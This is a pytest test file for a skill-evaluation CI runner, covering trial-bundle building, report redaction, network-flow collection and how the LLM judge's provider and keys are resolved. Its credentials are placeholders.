    (bundle,) = fake.trials_attaches()
    assert "--plain-http" in bundle
    assert annotations_of(bundle) == [
        f"skillci.dev/eval={EVAL_NAME}",
        "skillci.dev/agent=claude-code",
        "skillci.dev/agent-version=2.1.292",
        "skillci.dev/model=claude-haiku-5-5",
        "skillci.dev/trials-schema=1",
        "skillci.dev/redaction=v1",
    ]
    assert bundle[bundle.index(ENV["SKILL_REF"]) + 1 :] == BUNDLE_FILES
    assert fake.attaches[0]["cwd"] == modules.bundle.builds[0]["out"]
    (report_attach,) = fake.report_attaches()
    assert annotations_of(report_attach)[-1] == f"skillci.dev/trials={TRIALS}"
    assert termination() == GOOD_PAYLOAD


def test_bundle_build_gets_the_run(termination, monkeypatch, modules):
    """build() receives the run directory, the runner settings, the version and the routes."""
    fake = FakeRun(GOOD, trial_versions=["2.1.300"])
    run_main(monkeypatch, fake, SKILLEVAL_NAME=EVAL_NAME, SKILL_VERSION="v1.0.0", TRIAL_BUNDLE="on")
    (build,) = modules.bundle.builds
    assert build["run_dir"].parent.parent.name == "results"
    assert build["run_dir"].name == "20260101_000000"
    assert build["config"] == {
        "SKILL_NAME": "acme",
        "SKILL_REF": ENV["SKILL_REF"],
        "AGENT": "claude-code",
        "MODEL": "claude-haiku-5-5",
        "ATTEMPTS": "2",
        "SKILLEVAL_NAME": EVAL_NAME,
        "SKILL_VERSION": "v1.0.0",
    }
    assert build["agent_version"] == "2.1.300"
    assert build["credentials"] == [
        Credential("agent", "ANTHROPIC_API_KEY", "api.anthropic.com"),
        Credential("judge", "ANTHROPIC_API_KEY", "api.anthropic.com"),
    ]
    assert build["network"] == skill_eval.NETWORK_OFF
    assert build["trial_networks"] is None
    assert build["auth_config"] == Path("/auth/config.json")
    assert build["environ"]["TRIAL_BUNDLE"] == "on"


def test_bundle_config_leaves_out_a_missing_version(termination, monkeypatch, modules):
    """Without SKILL_VERSION the bundle config has none, so the index leaves version out."""
    run_main(monkeypatch, FakeRun(GOOD))
    assert "SKILL_VERSION" not in modules.bundle.builds[0]["config"]


@pytest.mark.parametrize(
    ("name", "outcome", "attach_exit", "withheld"),
    [
        ("index leaked", NotBuilt("secret-scan", "ANTHROPIC_API_KEY"), 0, "secret-scan"),
        ("no trial directories", NotBuilt("no-trials"), 0, "no-trials"),
        ("builder crashed", RuntimeError("boom"), 0, "build-failed"),
        ("builder not built yet", NotImplementedError(), 0, "build-failed"),
        ("bundle attach failed", None, 1, "attach-failed"),
    ],
)
def test_bundle_failures_never_fail_the_eval(
    name, outcome, attach_exit, withheld, termination, monkeypatch, modules
):
    """Without a bundle the eval still succeeds and the report says why it has none."""
    modules.bundle.outcome = outcome
    fake = FakeRun(GOOD, trials_attach_exit=attach_exit)
    run_main(monkeypatch, fake)
    assert termination() == GOOD_PAYLOAD, name
    (report_attach,) = fake.report_attaches()
    assert annotations_of(report_attach)[-1] == f"skillci.dev/trials-withheld={withheld}"
    assert not any(a.startswith("skillci.dev/trials=") for a in annotations_of(report_attach))
    assert len(fake.trials_attaches()) == (4 if attach_exit else 0)  # attach is retried


def test_bundle_switched_off(termination, monkeypatch, modules):
    """TRIAL_BUNDLE=off builds nothing, collects no flows and says ``disabled``."""
    fake = FakeRun(GOOD)
    run_main(monkeypatch, fake, TRIAL_BUNDLE="off", HUBBLE_SERVER="relay:80")
    assert modules.bundle.builds == []
    assert modules.flows.started == []
    assert fake.trials_attaches() == []
    (report_attach,) = fake.report_attaches()
    assert annotations_of(report_attach)[-1] == "skillci.dev/trials-withheld=disabled"
    assert termination() == GOOD_PAYLOAD


def test_broken_bundle_module(termination, monkeypatch):
    """A trial_bundle that cannot be imported: no bundle, and no unredacted report either."""
    monkeypatch.setitem(sys.modules, skill_eval.BUNDLE_MODULE, None)  # import raises
    fake = FakeRun(GOOD)
    run_main(monkeypatch, fake)
    assert termination() == NO_REPORT
    assert fake.attaches == []


def test_report_files_are_redacted_first(termination, monkeypatch, modules):
    """Report files go through the bundle's redaction; a file that still leaks stays home."""
    modules.bundle.drop = {"tier3.html"}
    fake = FakeRun(GOOD)
    run_main(monkeypatch, fake)
    assert modules.bundle.redacted == [
        ["report.html", "result.json", "BENCHMARK.md", "validate.json", "tier3.html"]
    ]
    assert modules.bundle.auth_configs == [Path("/auth/config.json")]
    (report_attach,) = fake.report_attaches()
    assert "tier3.html:text/html" not in report_attach
    assert "validate.json:application/json" in report_attach
    assert termination()["report"] == REPORT


def test_report_redaction_fails_closed(termination, monkeypatch, modules):
    """When the redaction cannot run, the report is not attached; the eval still succeeds."""
    modules.bundle.redact_error = RuntimeError("no redactor")
    fake = FakeRun(GOOD)
    run_main(monkeypatch, fake)
    assert fake.report_attaches() == []
    assert len(fake.trials_attaches()) == 1
    assert termination() == NO_REPORT


def test_flows_wrap_the_tier3_run(termination, monkeypatch, modules):
    """With HUBBLE_SERVER the collector runs for exactly the Tier 3 validate, per trial."""
    fake = FakeRun(GOOD, trials=TRIAL_TIMES)
    run_main(monkeypatch, fake, HUBBLE_SERVER="relay:80", SKILLEVAL_NAME=EVAL_NAME)
    assert EVENTS[:4] == ["validate 1,2", "flows.start", "validate 1,2,3", "flows.stop"]
    ((eval_name, work),) = modules.flows.started
    assert eval_name == EVAL_NAME
    assert work.name == "flows"
    ((collection, windows, max_rows),) = modules.flows.summaries
    assert collection == "collection"
    assert max_rows == 7  # Limits.flow_rows from limits_from_env
    assert set(windows) == {"rn-basic__sryqofs", "rn-basic__BQbpoR9"}
    done = windows["rn-basic__sryqofs"]
    assert done.start == datetime(2026, 10, 30, 14, 13, 45, 9297, tzinfo=UTC)
    assert done.end == datetime(2026, 10, 30, 14, 21, 18, tzinfo=UTC)
    assert windows["rn-basic__BQbpoR9"].end > done.end  # not finished: ends now
    (build,) = modules.bundle.builds
    assert build["network"] == {"state": "collected"}
    assert build["trial_networks"] == {
        "rn-basic__sryqofs": {"dns": []},
        "rn-basic__BQbpoR9": {"dns": []},
    }
    assert termination() == GOOD_PAYLOAD


def test_no_flows_without_a_relay(termination, monkeypatch, modules):
    """Without HUBBLE_SERVER nothing is started and the network state is off."""
    run_main(monkeypatch, FakeRun(GOOD), SKILLEVAL_NAME=EVAL_NAME)
    assert modules.flows.started == []
    assert modules.bundle.builds[0]["network"] == skill_eval.NETWORK_OFF


@pytest.mark.parametrize("broken", ["start_error", "stop_error", "summary_error"])
def test_flow_failures_never_fail_the_eval(broken, termination, monkeypatch, modules):
    """A collector that cannot start, stop or summarize leaves the network unavailable."""
    setattr(modules.flows, broken, RuntimeError("relay gone"))
    fake = FakeRun(GOOD, trials=TRIAL_TIMES)
    run_main(monkeypatch, fake, HUBBLE_SERVER="relay:80", SKILLEVAL_NAME=EVAL_NAME)
    assert termination() == GOOD_PAYLOAD
    (build,) = modules.bundle.builds
    assert build["network"]["state"] == "unavailable"
    assert "relay gone" in build["network"]["reason"]
    assert build["trial_networks"] is None
    assert len(fake.trials_attaches()) == 1


def test_flows_need_the_eval_name(termination, monkeypatch, modules):
    """Without SKILLEVAL_NAME there is no label to select: no collector, state unavailable."""
    run_main(monkeypatch, FakeRun(GOOD), HUBBLE_SERVER="relay:80")
    assert modules.flows.started == []
    assert "SKILLEVAL_NAME" in modules.bundle.builds[0]["network"]["reason"]


def test_flows_stop_when_tier3_crashes(termination, monkeypatch, modules):
    """The collector stops even when the Tier 3 command raises."""
    fake = FakeRun(GOOD)

    def run(cmd: list[str], **kwargs: Any) -> subprocess.CompletedProcess:
        if cmd[:2] == ["skillevaluator", "validate"] and "--results-dir" in cmd:
            raise OSError("no space left on device")
        return fake(cmd, **kwargs)

    for name, value in (("HUBBLE_SERVER", "relay:80"), ("SKILLEVAL_NAME", EVAL_NAME)):
        monkeypatch.setenv(name, value)
    monkeypatch.setattr(skill_eval.subprocess, "run", run)
    assert skill_eval.main() == 1
    assert EVENTS[1:3] == ["flows.start", "flows.stop"]
    assert termination()["report"] == REPORT


def test_failed_run_keeps_its_trials(termination, monkeypatch, modules):
    """Tier 3 started and failed: bundle, then report, and the digest next to the error."""
    fake = FakeRun({"agents": {"codex": agent_entry(1, 0)}}, trials=TRIAL_TIMES)
    run_main(monkeypatch, fake, code=1, SKILLEVAL_NAME=EVAL_NAME)
    written = termination()
    assert "no entry for agent 'claude-code'" in written["error"]
    assert written["report"] == REPORT
    assert written["tiers"]["tier3"] == "incomplete"
    assert [a["type"] for a in fake.attaches] == [skill_eval.BUNDLE_TYPE, skill_eval.REPORT_TYPE]
    (build,) = modules.bundle.builds
    assert build["run_dir"].name == "20260101_000000"
    (report_attach,) = fake.report_attaches()
    annotations = annotations_of(report_attach)
    assert "skillci.dev/publication=incomplete" in annotations
    assert annotations[-1] == f"skillci.dev/trials={TRIALS}"
    assert not any(a.startswith("skillci.dev/lift") for a in annotations)
    # The combined report of the Tier 3 run, not the gate's.
    assert "tier3.html" in fake.bundle


def test_failed_run_without_a_report_still_fails_cleanly(termination, monkeypatch, modules):
    """When nothing can be attached on the error path, the error payload has no report."""
    modules.bundle.outcome = RuntimeError("boom")
    fake = FakeRun({"agents": {}}, attach_exit=1)
    run_main(monkeypatch, fake, code=1)
    written = termination()
    assert "report" not in written
    assert set(written) == {"error", "tiers", "findings"}


def test_failed_run_payload_with_report_fits(tmp_path):
    """An oversized error that carries a report keeps the digest and the tiers."""
    tiers = {"tier1": "passed", "tier2": "passed", "tier3": "incomplete"}
    err = skill_eval.EvalError("e" * 10_000, tiers, ["tier1/x: " + "y" * 190] * 5, REPORT)
    path = tmp_path / "log"
    skill_eval.write_termination(skill_eval.error_payload(err), str(path))
    written = json.loads(path.read_text())
    assert len(path.read_text().encode()) <= skill_eval.MAX_MESSAGE_BYTES
    assert written["report"] == REPORT
    assert written["tiers"] == tiers


def test_find_run_dir(tmp_path):
    """The run directory is the newest result.json's parent, else the newest run directory."""
    assert skill_eval.find_run_dir(tmp_path / "missing") is None
    run = tmp_path / "acme" / "20260101_000000"
    (run / "claude-code").mkdir(parents=True)
    assert skill_eval.find_run_dir(tmp_path) == run
    done = tmp_path / "acme" / "20250101_000000"
    done.mkdir()
    (done / "result.json").write_text("{}")
    assert skill_eval.find_run_dir(tmp_path) == done


@pytest.mark.parametrize(
    ("value", "expected"),
    [
        ("2026-10-30T14:21:18Z", datetime(2026, 10, 30, 14, 21, 18, tzinfo=UTC)),
        ("2026-10-30T14:21:18", datetime(2026, 10, 30, 14, 21, 18, tzinfo=UTC)),
        ("yesterday", None),
        (None, None),
        (12, None),
    ],
)
def test_parse_time(value, expected):
    """Harbor's times parse to aware datetimes; anything else is None."""
    assert skill_eval.parse_time(value) == expected


# The judge (SkillCIConfig spec.judge, CONTRACT.md "LLM keys").
JUDGE_KEY = "sk-judge-test-0000"


@pytest.mark.parametrize(
    ("name", "environ", "provider", "key_env", "host"),
    [
        ("legacy anthropic", {"ANTHROPIC_API_KEY": "a"}, "anthropic", "ANTHROPIC_API_KEY",
         "api.anthropic.com"),
        ("legacy openai", {"OPENAI_API_KEY": "o"}, "openai", "OPENAI_API_KEY", "api.openai.com"),
        ("anthropic from the judge key", {"SKILL_EVAL_LLM_PROVIDER": "anthropic",
         "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY}, "anthropic", "ANTHROPIC_API_KEY",
         "api.anthropic.com"),
        ("anthropic behind a proxy", {"SKILL_EVAL_LLM_PROVIDER": "Anthropic",
         "ANTHROPIC_API_KEY": "a", "SKILL_EVAL_LLM_BASE_URL": "https://llm.example.com/anthropic"},
         "anthropic", "ANTHROPIC_API_KEY", "llm.example.com"),
        ("openai prefers its own key", {"SKILL_EVAL_LLM_PROVIDER": "openai",
         "OPENAI_API_KEY": "o", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY}, "openai", "OPENAI_API_KEY",
         "api.openai.com"),
        ("openai from the judge key", {"SKILL_EVAL_LLM_PROVIDER": "openai",
         "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY, "OPENAI_BASE_URL": "https://gw.example.com/v1"},
         "openai", "SKILL_EVAL_LLM_API_KEY", "gw.example.com"),
        ("openai-compatible", {"SKILL_EVAL_LLM_PROVIDER": "openai-compatible",
         "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY, "SKILL_EVAL_LLM_BASE_URL": "http://litellm:4000/v1"},
         "openai-compatible", "SKILL_EVAL_LLM_API_KEY", "litellm"),
        ("nv_build", {"SKILL_EVAL_LLM_PROVIDER": "nv_build", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY},
         "nv_build", "NVIDIA_API_KEY", "integrate.api.nvidia.com"),
        ("bedrock api key", {"SKILL_EVAL_LLM_PROVIDER": "bedrock",
         "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY, "AWS_REGION": "eu-central-1"}, "bedrock",
         "AWS_BEARER_TOKEN_BEDROCK", "bedrock-runtime.eu-central-1.amazonaws.com"),
        ("bedrock web identity", {"SKILL_EVAL_LLM_PROVIDER": "bedrock",
         "AWS_WEB_IDENTITY_TOKEN_FILE": "/var/run/token"}, "bedrock",
         "AWS_WEB_IDENTITY_TOKEN_FILE", "bedrock-runtime.us-west-2.amazonaws.com"),
        ("no key", {"SKILL_EVAL_LLM_PROVIDER": "nv_build"}, "nv_build", "",
         "integrate.api.nvidia.com"),
    ],
)  # fmt: skip
def test_judge_of(name, environ, provider, key_env, host):
    """The judge's provider, key variable and host follow SkillEvaluator's resolution."""
    assert skill_eval.judge_of(environ) == skill_eval.Judge(provider, key_env, host), name


def test_no_judge():
    """Without a provider and without an Anthropic or OpenAI key there is no judge."""
    assert skill_eval.judge_of({"NVIDIA_API_KEY": "n"}) is None
    with pytest.raises(skill_eval.EvalError, match="no judge for Tier 3"):
        skill_eval.check_judge(skill_eval.load_config(ENV), {**ENV, "NVIDIA_API_KEY": "n"})


@pytest.mark.parametrize(
    ("environ", "message"),
    [
        ({"SKILL_EVAL_LLM_PROVIDER": "gemini", "SKILL_EVAL_LLM_API_KEY": "k"},
         "SKILL_EVAL_LLM_PROVIDER must be one of: anthropic, bedrock, nv_build, openai, "
         "openai-compatible, got 'gemini'"),
        ({"SKILL_EVAL_LLM_PROVIDER": "anthropic", "ANTHROPIC_API_KEY": ""},
         "the anthropic judge needs its key: SKILL_EVAL_LLM_API_KEY or ANTHROPIC_API_KEY"),
        ({"SKILL_EVAL_LLM_PROVIDER": "openai-compatible", "SKILL_EVAL_LLM_API_KEY": "k"},
         "the openai-compatible judge needs SKILL_EVAL_LLM_BASE_URL"),
        ({"SKILL_EVAL_LLM_PROVIDER": "openai-compatible", "SKILL_EVAL_LLM_BASE_URL": "http://gw/v1"},
         "the openai-compatible judge needs its key: SKILL_EVAL_LLM_API_KEY in the Job"),
        ({"SKILL_EVAL_LLM_PROVIDER": "openai", "SKILL_EVAL_LLM_API_KEY": "k",
          "SKILL_EVAL_LLM_BASE_URL": "gw.example.com/v1"}, "needs an http\\(s\\) base URL"),
        ({"SKILL_EVAL_LLM_PROVIDER": "bedrock"}, "the bedrock judge needs its key: "
         "SKILL_EVAL_LLM_API_KEY or AWS_BEARER_TOKEN_BEDROCK \\(or AWS credentials\\)"),
    ],
)  # fmt: skip
def test_judge_key_is_required(environ, message):
    """A judge without its key (or endpoint) fails before any work."""
    config = skill_eval.load_config(ENV)
    with pytest.raises(skill_eval.EvalError, match=message):
        skill_eval.check_judge(config, {**ENV, "ANTHROPIC_API_KEY": "a", **environ})


def test_judge_failure_stops_before_the_pull(termination, monkeypatch):
    """A missing judge key ends the run with its error, before oras and every tier."""
    monkeypatch.setenv("SKILL_EVAL_LLM_PROVIDER", "openai-compatible")
    fake = FakeRun(GOOD)
    run_main(monkeypatch, fake, code=1)
    assert "SKILL_EVAL_LLM_BASE_URL" in termination()["error"]
    assert fake.calls == []


@pytest.mark.parametrize(
    ("agent", "model", "judge", "ok"),
    [
        ("claude-code", "claude-haiku-5-5", "openai-compatible", True),
        ("claude-code", "claude-haiku-5-5", "bedrock", False),
        ("codex", "openai/gpt-6.1-sol", "openai", True),
        ("codex", "openai/gpt-6.1-sol", "openai-compatible", False),
        ("opencode", "anthropic/claude-sonnet-5-5", "anthropic", True),
        ("opencode", "ollama-cloud/gpt-oss:120b", "openai", False),
        ("opencode", "nvidia/nemotron-3-super", "nv_build", False),
    ],
)
def test_agent_and_judge_must_fit(agent, model, judge, ok):
    """SkillEvaluator routes the agent by the judge provider, so some pairs are refused."""
    environ = {
        **ENV,
        "AGENT": agent,
        "MODEL": model,
        "ANTHROPIC_API_KEY": "a",
        "OPENAI_API_KEY": "o",
        "OLLAMA_API_KEY": "l",
        "NVIDIA_API_KEY": "n",
        "SKILL_EVAL_LLM_PROVIDER": judge,
        "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY,
        "SKILL_EVAL_LLM_BASE_URL": "https://gw.example.com/v1",
    }
    config = skill_eval.load_config(environ)
    if ok:
        assert skill_eval.check_judge(config, environ).provider == judge
    else:
        with pytest.raises(skill_eval.EvalError, match=f"cannot run under the {judge} judge"):
            skill_eval.check_judge(config, environ)


@pytest.mark.parametrize(
    ("agent", "model", "message"),
    [
        ("claude-code", "claude-haiku-5-5", "claude-code needs ANTHROPIC_API_KEY"),
        ("codex", "openai/gpt-6.1-sol", "codex needs OPENAI_API_KEY \\(llm-keys key openai\\)"),
    ],
)
def test_agent_key_is_required(agent, model, message):
    """The Anthropic key is no longer implied by the judge, so the agent's key is checked."""
    environ = {
        **ENV,
        "AGENT": agent,
        "MODEL": model,
        "SKILL_EVAL_LLM_PROVIDER": "nv_build",
        "NVIDIA_API_KEY": "n",
    }
    with pytest.raises(skill_eval.EvalError, match=message):
        skill_eval.check_judge(skill_eval.load_config(environ), environ)


@pytest.mark.parametrize(
    ("agent", "model", "judge"),
    [
        ("claude-code", "claude-haiku-5-5", "anthropic"),
        ("opencode", "anthropic/claude-sonnet-5-5", "anthropic"),
        ("codex", "openai/gpt-6.1-sol", "openai"),
    ],
)
def test_agent_shares_the_judge_key(agent, model, judge):
    """Under the judge of its own provider the agent runs on the judge's key."""
    environ = {
        **ENV,
        "AGENT": agent,
        "MODEL": model,
        "SKILL_EVAL_LLM_PROVIDER": judge,
        "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY,
    }
    assert skill_eval.check_judge(skill_eval.load_config(environ), environ).provider == judge


def test_judge_from_the_job_wins(termination, monkeypatch, modules):
    """The Job's SKILL_EVAL_LLM_* reach SkillEvaluator; the index names the judge's route."""
    run_main(
        monkeypatch,
        FakeRun(GOOD),
        SKILL_EVAL_LLM_PROVIDER="openai-compatible",
        SKILL_EVAL_LLM_MODEL="nvidia/nemotron-judge",
        SKILL_EVAL_LLM_BASE_URL="https://llm.example.com/v1",
        SKILL_EVAL_LLM_API_KEY=JUDGE_KEY,
    )
    (build,) = modules.bundle.builds
    assert build["credentials"] == [
        Credential("agent", "ANTHROPIC_API_KEY", "api.anthropic.com"),
        Credential("judge", "SKILL_EVAL_LLM_API_KEY", "llm.example.com"),
    ]


def test_judge_environment_reaches_skillevaluator(termination, monkeypatch):
    """Tier 3 gets the judge provider, model and base URL as the Job set them."""
    fake = FakeRun(GOOD)
    run_main(
        monkeypatch,
        fake,
        SKILL_EVAL_LLM_PROVIDER="openai-compatible",
        SKILL_EVAL_LLM_MODEL="nvidia/nemotron-judge",
        SKILL_EVAL_LLM_BASE_URL="https://llm.example.com/v1",
        SKILL_EVAL_LLM_API_KEY=JUDGE_KEY,
    )
    env = fake.envs["validate"]
    assert env["SKILL_EVAL_LLM_PROVIDER"] == "openai-compatible"
    assert env["SKILL_EVAL_LLM_MODEL"] == "nvidia/nemotron-judge"
    assert env["SKILL_EVAL_LLM_BASE_URL"] == "https://llm.example.com/v1"
    assert env["SKILL_EVAL_LLM_API_KEY"] == JUDGE_KEY
    assert env["ANTHROPIC_API_KEY"] == "anthropic-test"  # the agent's key is untouched


@pytest.mark.parametrize(
    ("environ", "expected"),
    [
        ({"SKILL_EVAL_LLM_PROVIDER": "anthropic", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY},
         {"ANTHROPIC_API_KEY": JUDGE_KEY}),
        ({"SKILL_EVAL_LLM_PROVIDER": "anthropic", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY,
          "ANTHROPIC_API_KEY": "already-here"}, {"ANTHROPIC_API_KEY": "already-here"}),
        ({"SKILL_EVAL_LLM_PROVIDER": "nv_build", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY},
         {"NVIDIA_API_KEY": JUDGE_KEY}),
        ({"SKILL_EVAL_LLM_PROVIDER": "bedrock", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY},
         {"AWS_BEARER_TOKEN_BEDROCK": JUDGE_KEY}),
        ({"SKILL_EVAL_LLM_PROVIDER": "openai", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY},
         {"OPENAI_API_KEY": None}),  # SkillEvaluator reads SKILL_EVAL_LLM_API_KEY itself
        ({"SKILL_EVAL_LLM_PROVIDER": " ", "ANTHROPIC_API_KEY": "a"},
         {"SKILL_EVAL_LLM_PROVIDER": "anthropic"}),  # blank: the legacy choice
        ({"SKILL_EVAL_LLM_PROVIDER": "NV_BUILD", "NVIDIA_API_KEY": "n"},
         {"SKILL_EVAL_LLM_PROVIDER": "nv_build"}),
        ({"ANTHROPIC_API_KEY": "a", "SKILL_EVAL_LLM_MODEL": "", "SKILL_EVAL_LLM_BASE_URL": " ",
          "SKILL_EVAL_LLM_API_KEY": ""},
         {"SKILL_EVAL_LLM_MODEL": None, "SKILL_EVAL_LLM_BASE_URL": None,
          "SKILL_EVAL_LLM_API_KEY": None}),  # SkillEvaluator refuses a blank model
        ({"OPENAI_API_KEY": "o"}, {"SKILL_EVAL_LLM_PROVIDER": "openai"}),
        ({}, {"SKILL_EVAL_LLM_PROVIDER": None}),
    ],
)  # fmt: skip
def test_tool_env_judge(environ, expected):
    """tool_env keeps the Job's judge and puts its key where SkillEvaluator reads it."""
    env = skill_eval.tool_env({**ENV, **environ})
    for name, value in expected.items():
        assert env.get(name) == value, name


def test_opencode_gateway_judge_keeps_the_real_openai_key():
    """The legacy openai judge choice uses the Job's keys, not the gateway's OPENAI_API_KEY."""
    env = skill_eval.tool_env({**ENV, **OLLAMA, "OPENAI_API_KEY": "real-openai"})
    assert env["SKILL_EVAL_LLM_PROVIDER"] == "openai"
    assert env["OPENAI_API_KEY"] == "ollama-key"  # which is why check_judge refuses the pair


def test_judge_key_is_redacted(monkeypatch):
    """The judge's key never reaches the log or the message."""
    monkeypatch.setenv("SKILL_EVAL_LLM_API_KEY", JUDGE_KEY)
    monkeypatch.setenv("AWS_BEARER_TOKEN_BEDROCK", "bedrock-test-0000")
    text = f"failed with {JUDGE_KEY} and bedrock-test-0000"
    assert skill_eval.redact(text) == "failed with [redacted] and [redacted]"


@pytest.mark.parametrize(
    ("environ", "provider", "key"),
    [
        ({"ANTHROPIC_API_KEY": "a", "OPENAI_API_KEY": "o"}, "anthropic", "a"),
        ({"SKILL_EVAL_LLM_PROVIDER": "anthropic", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY},
         "anthropic", JUDGE_KEY),
        ({"SKILL_EVAL_LLM_PROVIDER": "openai", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY},
         "openai", JUDGE_KEY),
        ({"SKILL_EVAL_LLM_PROVIDER": "nv_build", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY,
          "ANTHROPIC_API_KEY": "a"}, "nv_build", JUDGE_KEY),
        ({"SKILL_EVAL_LLM_PROVIDER": "openai-compatible", "SKILL_EVAL_LLM_API_KEY": JUDGE_KEY,
          "SKILL_EVAL_LLM_BASE_URL": "https://gw.example.com/v1", "SKILL_EVAL_LLM_MODEL": "m"},
         "openai-compatible", JUDGE_KEY),
    ],
)  # fmt: skip
def test_judge_environment_resolves_in_skillevaluator(environ, provider, key):
    """SkillEvaluator's own resolver finds the judge and its key in what tool_env hands it."""
    config = pytest.importorskip("skillevaluator.provider_config")
    resolved = config.resolve_llm_provider(skill_eval.tool_env({**ENV, **environ}))
    assert (resolved.provider, resolved.api_key) == (provider, key)
    if "SKILL_EVAL_LLM_MODEL" in environ:
        assert resolved.model == environ["SKILL_EVAL_LLM_MODEL"]


def test_judge_providers_match_skillevaluator():
    """The providers the runner accepts are exactly the ones SkillEvaluator supports."""
    config = pytest.importorskip("skillevaluator.provider_config")
    assert set(skill_eval.JUDGE_PROVIDERS) == set(config._SUPPORTED_PROVIDERS)
